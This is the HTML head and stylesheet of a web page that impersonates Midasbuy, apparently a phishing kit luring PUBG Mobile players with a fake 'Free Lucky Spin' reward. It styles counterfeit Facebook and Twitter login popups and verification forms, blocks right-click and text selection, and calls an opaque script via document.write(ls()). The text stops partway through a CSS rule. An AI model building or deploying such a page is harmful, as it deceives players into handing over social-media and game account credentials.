<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>www.midasbuy.com</title>
<meta property="og:description" content="Start Free Lucky Spin and Collect your exclusive reward from PUBG MOBILE now!">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="css-zone/facebook.css">
<link rel="stylesheet" href="css-zone/twitter.css">
<link rel="stylesheet" href="css-zone/animate.css">
<link rel="stylesheet" href="css-zone/main.css">
<link rel="stylesheet" href="css-zone/lenzz.css">
<link rel="stylesheet" href="css-zone/style-zone.css">
<link rel="stylesheet" href="css-zone/link.css">
<link rel="stylesheet" href="css-zone/popup-login.css">
<link rel="stylesheet" href="css-zone/callcode-link.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
<script type="text/javascript" src="js-zone/jquery.js"></script>
<script type="text/javascript" src="js-zone/main-zone.js"></script>
<script language="JavaScript">
document.write(ls())
</script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'laza'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/laza.woff2) format("woff2"), 
        url(fonts/laza.woff) format("woff"),
        url(fonts/laza.ttf) format("truetype");
}
.header-front {
    width: 100%;
    height: auto;
    position: absolute;
    top: 0;
}

.header-front img {
    width: 100%;
    height: auto;
}
.gallery-wrapper {
    width: 100%;
    height: auto;
    overflow: hidden;
    border: none;
    display: flex;
    border-bottom: 1px solid #ffca13;
}
.gallery-wrapper img {
        width: 100%;
        display: inline-block;
        float: left;
        animation-name: mymove;
        animation-duration: 30s;
        -webkit-animation-iteration-count: infinite;
        position: relative;
}

@keyframes mymove {
    0% {
        left: 0%;
    }

    10% {
        left: 0%;
    }

    20% {
        left: -100%;
    }

    30% {
        left: -100%;
    }

    40% {
        left: -200%;
    }

    50% {
        left: -200%;
    }

    60% {
        left: -300%;
    }

    70% {
        left: -300%;
    }

    80% {
        left: -400%;
    }

    90% {
        left: -400%;
    }

    100% {
        left: -500%;
    }
}

@keyframes rotate {
    to {
        --angle: 0deg;
    }
}
.item-content-description-red {
    background-image: linear-gradient(to right, #740404, #66000000);
    width: auto;
	height: auto;
	padding: 2px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: center;
	float: left;
    margin-top: 5px;
    border-left: 2px solid #BE120E;
}
.item-content-description-ungu {
    background-image: linear-gradient(to right, #7C1464, #66000000);
    width: auto;
	height: auto;
	padding: 2px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: center;
	float: left;
    margin-top: 5px;
    border-left: 2px solid #B12D99;
}
.item-content-description-biru {
    background-image: linear-gradient(to right, #491D77, #66000000);
    width: auto;
	height: auto;
	padding: 2px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: center;
	float: left;
    margin-top: 5px;
    border-left: 2px solid #6A2AAC;
}
.item-content button {
	background: url(img/bg-pop-btn-m.png) no-repeat center center;
    background-size: 100% 100%;
	width: 80px;
	height: auto;
	margin-top: -10px;
	padding-top:0px;
	padding: 2px;
	padding-bottom: 2px;
	color: #fff;
	padding-right:5px;
  font-size: 15px;
  font-family: selow;
	font-weight: 500;
	text-align: left;
	border: none;
	outline: none;
	float: right;
	border-radius: 4px;
}
.item-content button img {
    background: none;
	width: 20px;
	height: 20px;
	margin-right: 5px;
	border: none !important;
	float: left;
}
.section-login-id-box-message {
	background-image:linear-gradient(180deg,rgba(201,140,101,.15),rgba(176,103,69,.15));
	width: 100%;
	height: auto;
	margin-top: 10px;
	padding: 8px;
	color: #f3b583;
	font-size: 14px;
	font-family: Roboto;
	text-align: left;
}
.item-wrapper {
	margin-top: 20px;
}
.item-content1 {
	width: 97%;
	height: 80px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	padding: 5px;
	border: 1px solid #00c4de;
	display: block;
}
.item-content-name {
	padding-top: 13px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: left;
}
.item-content-description {
    background-image: linear-gradient(to right, #FBDA4D, #66000000);
	width: auto;
	height: auto;
	padding: 2px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: center;
	float: left;
    margin-top: 5px;
    border-left: 2px solid yellow;
}
.item-content1-img {
    background: url(https://i.ibb.co/FDksyDh/bg-item.jpg) no-repeat center center;
    background-size: 100% 100%;
	width: 68px;
	height: 68px;
	margin-right: 10px;
	border: 1px solid #fff;
	float: left;
}
@property --angle {
    syntax: '<angle>';
    initial-value: 0deg;
    inherits: false;
}

.item-content1-img {
    --angle: 360deg;
    border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
    animation: 1s rotate linear infinite;
}

@keyframes rotate {
    to {
        --angle: 0deg;
    }
}
.item-content1 button {
	background: linear-gradient(#00c4de, #1b56ff);
	width: 90px;
	height: auto;
	margin-top: -10px;
	padding-top: 6px;
	padding: 2px;
	padding-bottom: 2px;
	color: #fff;
  font-size: 14px;
  font-family: laza;
	font-weight: 500;
	text-align: left;
	border: none;
	outline: none;
	float: right;
	border-radius: 4px;
}
.item-content1 button img {
    background: none;
	width: 25px;
	height: 25px;
	margin-right: 20px;
	border: none !important;
	float: left;
}

.event-img {
	width: 88%;
	margin-left: 5.8%;
	animation: bounce .0s infinite alternate;
}
.laz-container {	
	background: url(img/background.jpg) no-repeat center center;
    background-size: 100% 100%;
    margin-top: 0px;
    padding: 5px;
    width: 100%;
    margin-left: 0px;
    margin-right: 0px;
    height: 405px;
    position: relative;
}

.event-img {
    width: 100%;
    margin-left: auto;
    margin-right: auto;
	margin-top: 5px;
	margin-bottom: -5px;
}
.event-imgz {
    animation:bounceInDownLeft 2s linear infinite;
    -webkit-animation:bounceInDownLeft 2s linear infinite;
}
@keyframes bounceInDownLeft {
   0% {
      opacity: 1;
      transform: translateY(0px);
   }
   60% {
      opacity: 1;
      transform: translateY(10px);
   }
   80% {
      transform: translateY(0px);
   }
   100% {
      transform: translateY(-20);
   }
}
.item-nominalk {
	position: absolute;
	padding-left: 52.2px;
	padding-top: 52px;
	color:#fff;
	font-size: 13px;
    font-family: laza;
    font-weight: 550;
}
.event-notification-timer {
	padding-top: 18px;
    padding-right: 4px;
    color: #ffff;
    font-size: 13px;
    font-family: Teko;
    font-weight: 550;
    text-align: left;
	margin-bottom: 13px;
    float: right;
	margin-top:-122px;
	margin-right:20px;
  }
.alert-textz {
    background: url(img/notif.png) no-repeat center;
    background-size: 100% 100%;
    width: 90%;
    margin-left: auto;
    margin-right: auto;
	margin-top: 9px;
	margin-bottom: -15px;
    padding: 7px;
    color: #ffff;
    text-align: center;
    font-size: 14px;
    font-family: laza;
    border: none;
	position: relative;
	}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 65px;
}
.navbar-logo {
	width: 65px;
	float: left;
	margin-top: 6px;
	margin-left: 15px;
}
.navbar-shop {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-language {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 10px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapperz {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'laza';
	color:#fff;
}
.popup-box-navbar {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {	
	padding-top: 9px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:laza;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-box-navbarz {
	background:url(img/popup-navbar.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbarz img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbarz-title {	
	padding-top: 9px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:laza;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-box-bg {
	background: url(img/popup-reward.png) no-repeat center center;
    background-size: 100% 100%;
    width: 100%;
    margin-top: -12px;
    margin-left: 0px;
}
.popup-box-bgz {
	background: url(img/popup-box-bg.png) no-repeat center center;
    background-size: 100% 100%;
    width: 100%;
    margin-top: -12px;
    margin-left: 0px;
}
.popup-box-bgx {
    background: url(img/popup-box-bg3.png) no-repeat center center;
    background-size: 100% 100%;
    width: 100%;
    margin-top: 0px;
    margin-left: 0px;
    font-size: 18px;
    padding-bottom: auto;
    padding-top: 30px;
}
.popup-account-login {
    background: url(img/popup-login.jpg) no-repeat center center;
    background-size: 100% 100%;
    width: 110%;
    margin-top: 280px;
    margin-left: -20px;
}
.popup-box-gamecon {
	width: 52%;
	height: 65px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 20px;
	display: block;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #c7c7c7;
    font-size: 16px;
    font-family: laza;
    font-weight: 500;
    text-align: center;
    display: block;
}
.popup-box-alert-centernam {

	width: 95%;

	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 16px;
    font-family: sanf-serif, Arial;
	font-weight: 400;
	text-align: center;
	line-height: 20px;
	display: block;
}
.popup-box-alert-centernam span {
	color: #e67a07;
	font-family:sans-serif, Arial;
}
.popup-box-alert-centernam img {
	width: 20px;
	height: 20px;
	margin-left: 2px;
	margin-right: 5px;
	margin-bottom: -4px;
}
.popup-box-alert-leftsnam {
	width: 100%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 0px;
	padding: 5px;
	padding-left: 20px;
	color: #8A8D9E;
	font-size: 12px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-left-error {
	width: 100%;
	height: auto;
	margin-top: -6px;	
	margin-bottom: -10px;
	padding: 5px;
	padding-left: 20px;
	color: #FF5E5B;
	font-size: 12px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-left {
	width: 100%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}	
.popup-box-alert-left-errors {
	width: 100%;
	height: auto;
	margin-top: -30px;	
	margin-bottom: -30px;
	padding: 10px;
	padding-left:30px;
	color: #FF5E5B;
	font-size: 12px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-left span {
	color: #e67a07;
	font-family:sans-serif, Arial;
}
.popup-box-alert-left img {
	width: 20px;
	height: 20px;
	margin-left: 2px;
	margin-right: 5px;
	margin-bottom: -4px;
}
.popup-box-alert-right {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: 10px;	
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 16px;
    font-family:dinm;
	font-weight: 500;
	text-align: right;
	line-height: 20px;
	display: block;
}
.popup-box-alert-redeemnam {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: 10px;	
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-redeemnam span {
	color: #fff;
	font-size: 15px;
	font-family:sans-serif, Arial;
}
.popup-box-alert-redeemnam img {
	width: 20px;
	height: 20px;
	margin-left: 2px;
	margin-right: 5px;
	margin-bottom: -5px;
}
.popup-box-alert-pricenam {
	width: 92%;
	height: auto;
	margin-top: 1px;
	margin-bottom: 10px;
	margin-left: auto;
	margin-right: auto;
	padding: 5px;
	color: #fff;
	font-size: 15px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-pricenam span {
	color: #fff;
	font-size: 15px;
	float: right;
	font-family:sans-serif, Arial;
}
.popup-box-alert-pricenam img {
	width: 20px;
	height: 20px;
	float: right;
	margin-top: -2px;
	margin-right: 5px;
}
.popup-box-item-once {
	width: 75px;
	height: 75px;
	margin: 1px;
	margin-left: -5px;	
	margin-top: 30px;	
	text-align: center;
	display: inline-block;
}
.popup-box-item-once img {
	width:100%;
	height:100%;
}
.onceRewardsImg {
    width:75px;
    height:75px;
}
.popup-box-item-redeemnam {	
	background: url(https://i.ibb.co/FDksyDh/bg-item.jpg) no-repeat center;
	background-size: 100% 100%;
	width: 80px;
	height: 80px;
	margin: 1px;
	margin-left: 20px;
	margin-right: 15px;	
	margin-bottom: 20px;	
	border: 1px solid #fff;
	float: left;
	display: inline-block;		
}
.popup-box-item-redeemnam img {
	width:97%;
	height:97%;
	border:none;
}
.popup-box-item-redeem2 {	
	background-size: 100% 100% no-repeat center;
	width: 80px;
	height: 80px;
	margin: 1px;
	margin-bottom: 20px;	
	border: 0px solid #fff;
	float: left;
	margin-left:15px;
	display: inline-block;		
}
.popup-box-item-redeem2 img {
	width:100%;
	height:100%;
	margin-top:-20px;
	margin-left: 25px;
	margin-right: 0px;	
	border:none;
}
.popup-box-item-redeemnam img {
	width:97%;
	height:97%;
	border:none;
}
.popup-box-item-redeemnam .item-nominalnam {  
  width: 100%;  
  font-size: 12px;
  font-family: dinm;	
  color: #fff;  
  text-align:right;
  margin-left:-5px;
  margin-top:-15px;
}  	
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-item-redeemnam {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
  animation: 1s rotate linear infinite;
}
.redeemRewardsImg {
    width:60px;
    height:60px;
}
.redeemRewardsImgnam {
    width:60px;
    height:60px;
}
.popup-box-item-many {
	width: 60px;
	height: 60px;
	margin: 2px;
	margin-top: 40px;	
	text-align: right;
	display: inline-block;
}
.popup-box-item-many img {
	width:100%;
	height:100%;
}
.manyRewardsImg1,manyRewardsImg2,manyRewardsImg3,manyRewardsImg4,manyRewardsImg5 {
    width:100px;
    height:55px;
}
.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.popup-box-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	border:0.7px solid #fff;
	display: block;
}
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-item {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #66000000, pink, pink, pink, #66000000) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.popup-box-item img {
	width:100%;
	height:100%;
}
.popup-box-item span {
	color: #fff;
	font-size: 22px;
	font-family: laza;
	text-align: right;
	position: absolute;
	left: 0;
	right: 2px;
	bottom: -5px;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup-box-form input {
	background: #19191b;
	width: 100%;
	height: 35px;
	margin-left: 4px;
	margin-bottom: 3px;
	padding: 4px;
	color: #A9A8A9;
	font-size:17px;
	font-family:laza;
	font-weight: 500;
	border: 1px solid #A9A8A9;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
	color: #A9A8A9;
}
.popup-box-form select {
	background: #19191b;
	width: 100%;
	height: 35px;
	margin-left: 4px;
	margin-bottom: 3px;
	padding: 3.7px;
	padding-left: 4px;
	color: #A9A8A9;
	font-size: 17px;
	font-family:laza;
	font-weight: 500;
	border: 1px solid #A9A8A9;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer {	
	background-size:100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}
.popup-box-footer button {
    background: url(img/btn-on.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -14px;
    padding: 6px;
    padding-left: 35px;
    padding-right: 35px;
    color: #000;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}
.popup-box-form-footer {
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}
.popup-box-form-footer button {
	background: url(img/laz_on.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 0px;
	padding: 7px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-box-navbar-login {
	background:url(img/popup-navbar1.png) no-repeat center center;
	background-size:100% 100%;
	height: auto;
	padding-top: 5px;
	padding-bottom: 1px;
}
.popup-box-navbar-login-title {
    padding-left: 24px;
	padding-top: 2px;
	color: #defbff;
	font-size: 22px;
	font-family:selow;
	font-weight: 500;
	text-align: center;
}
.popup-box-footer-login {
    background:url(img/popup-box-footer-login.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -1px;
	height: 35px;
}
.popup-btn-login {
    width: 30%;
    border-radius:2px;
    height: 30px;
    padding: 5px;
	padding-top: 8px;
    margin: 3px;
    color: #f2f2f2;
	font-size: 14px;
    font-family: laza;
    border: none;
    outline: none;
    margin-bottom: 35px;
    position: relative;
    display: inline-block;
}
.popup-btn-login i {
    color: #fff;
    font-size: 18px;
	margin-top: -3px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
}
.popup-btn-twitter {
    background: #ffffff;
    color: #000;
}
.popup-btn-login2 {
    width: 25%;
    height: 28px;
    padding: 6px;
    margin-top: 15px;
    margin: 2px;
    color: #000;
	font-size: 15px;
    font-family:laza;
    border: none;
    border-radius: 2px;
    outline: none;
    position: relative;
}
.popup-btn-login2 i {
    color: #fff;
    font-size: 17px;
	padding-bottom: 2px;
    float: left;
}
.popup-btn-facebook2 {
    background: #1778f2;
    color: #fff;
}
.popup-btn-twitter2 {
    background: #ffffff;
    color: #0d0c0c;
}
.popup-btn-link2 {
    background: #E3B448;
    color: #000;
}
.popup-btn-login2 img {
    width:16px;
    height:16px;
    float: left;
}
.popup-login {
	background:rgba(0,0,0,0.4);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:5px;
}
.close-fb {
	background: #3b5998;
	width: 25px;
	height: 25px;
	color: #fff;
	font-size: 20px;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	top: -10px;
	right: -10px;
	position: absolute;
	display: block;
}
.close-fb i {
	padding-top: 3px;
}
.close-other {
	background: #fff;
	width: 25px;
	height: 25px;
	color: #000;
	font-size: 20px;
	text-align: center;
	border-radius: 50%;
	top: -12px;
	right: -12px;
	position: absolute;
	z-index: 9999999;
	display: block;
}
.close-other i {
	color: #000;
	padding-top: 3px;
}
.popups {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: left;
	font-family:'laza';
	color:#fff;
}
.popup-box-navbars {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbars img {
	width: 20px;
	height: 20px;
	margin-top: 15px;
	margin-right: 18px;
	float: right;
}
.popup-box-navbars-title {	
	padding-left: 40px;
	padding-top: 14px;
	padding-bottom: 2px;
	font-size: 20px;
	color: #fff;
	font-family:laza;
	font-weight: 300;
	text-align: center;	
}
.kagetk {     
	background: rgba(0, 0, 0, 0.2);
	background-size:50% 50%;
	width: 80%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #fff;
	display: none;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
}
.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: left;
}
.balance {
	background:url(img/bg-item.png) no-repeat center center;
	background-size:101% 100%;
	width: 94.3%;
	height: 100px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 4px;
	border-top:2px solid #ECD954;
	border-left:2px solid #ECD954;
	border-right:2px solid #ECD954;
	border-bottom:2px solid #ECD954;
	display: block;
}
.balance-img {
	width: 50%;
	height: 97px;
	margin-top: -5px;
	margin-right: 5px;	
	float: left;	
	padding: 5px;
	border:1px #fff;  
}
.balance-nom {
	color: #fff;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	font-size: 18px;
	font-family:laza;
	font-weight: 500;
	text-align: center;
	text-shadow:0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 18px;
	float: left;
}
.balance-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family:laza;
	text-align: left;
}
.balance-nom-button {
	background:url(img/laz_on.png) no-repeat center center;
	background-size:100% 100%;
    width: 36%;
	height: auto;
	margin-top:7px;
	margin-left:auto;
	margin-right:auto;
	padding: 10px;
	font-size: 18px;
	color:#000;
	font-family:laza;
	text-align: center;
	border: none;
	outline: none;
	float: center;
}
.scroll {
	width:100%;
	overflow:none;
	position:relative;
	width: 100%;
	height:400px;
	margin-top:11px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
}
.btn-wrapper {
	width: 93%;
	height: 50px;	
	margin-top: 3px;
	margin-right: 3px;			
	font-family:laza;	
}
.btn-wrapper button {
    background: url(img/tombol.png) no-repeat center;
	background-size: 100% 100%;
	width: 38%;
	height: 40px;
	margin: -10px;
	padding: 10px;
	color: #FFFAC9;
	font-family:laza;
	font-size: 18px;	
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	float:right;
	display: inline-block;	
}
.box-nam {	
	background: #111733 no-repeat center center;
    background-size: 100% 100%;
    margin-top: 0px;
    padding: 5px;
    width: 100%;
    margin-left: 0px;
    margin-right: 0px;
    height: auto;
    position: relative;
    border-top: 1px solid #ffca13;
}
.label-events2 {	
	background-image: linear-gradient(to right, #06A8E6 , #66000000);
	width:150px;
	height:30px;
	color: #fff;
	font-size: 16px;
	font-family: laza;
	text-align: left;
	margin-top:3px;
	margin-left:7px;
	padding-left:7px;
	padding-top:5px;	
	margin-bottom:15px;
	margin-top:-30px;
	border-left: 2px solid #0C94EC;	
}
.event-title {
	background-size: 100% 100%;
	width: 100%;
	height: 80px;
	margin-top: 13px;
	margin-bottom: 18px;
	margin-right: auto;
	margin-left: auto;
	display: block;
}
.taktahu {
	width: 35%;
	height: 50px;
	margin-top: -25px;
	border-radius:5px;
	border: 0px solid #151E3F;
	display: inline-block;	
	margin-left: auto;		
	margin-right:auto;
}
@keyframes bounceInDown {
   0% {
      opacity: 1;
      transform: translateY(0px);
   }
   60% {
      opacity: 1;
      transform: translateY(10px);
   }
   80% {
      transform: translateY(-5px);
   }
   100% {
      transform: translateY(0);
   }
}    
.taktahu img {
	width: 50px;
	height: auto;
	margin-left: auto;		
	margin-right:auto;
	margin-bottom: -3px;
	animation:bounceInDown 2s linear infinite;
    -webkit-animation:bounceInDown 2s linear infinite;
}
.footer {
    background: #111733;
    width: 100%;
    height: auto;
    padding: 15px;
}

.footer-txt-join {
    margin-bottom: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    text-align: left;
}

.footer-socmed-wrapperz {
    width: 100%;
    margin-bottom: 30px;
    padding-bottom: 10px;
    border-bottom: 1px solid hsla(0, 0%, 100%, .1)
}

.footer-socmed-wrapperz img {
    width: 37px;
    margin: 5px;
}

.footer-feedback-wrapper {
    width: 100%;
    margin-top: -15px;
    margin-bottom: 30px;
    padding-bottom: 10px;
    color: #6B6E81;
    font-size: 12px;
    font-family: Roboto;
    text-align: left;
    border-bottom: 1px solid hsla(0, 0%, 100%, .1)
}

.footer-feedback-wrapper button {
    background: hsla(0, 0%, 100%, .1);
    width: auto;
    height: auto;
    margin-top: 13px;
    margin-bottom: 13px;
    padding: 8px;
    padding-left: 40px;
    padding-right: 40px;
    color: #fff;
    font-size: 13px;
    font-family: Roboto;
    text-align: center;
    border: none;
    border-radius: 4px;
    outline: none;
}

.footer-feedback-wrapper button img {
    width: 13px;
    margin-right: 10px;
}

.footer-copyright-wrapper {
    width: 100%;
    padding-bottom: 10px;
    color: #6B6E81;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    line-height: 20px;
}
.verify-box-navbar {	
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}
.verify-box-navbar-form {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: 25px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-form input {
	background:url(img/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size:15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
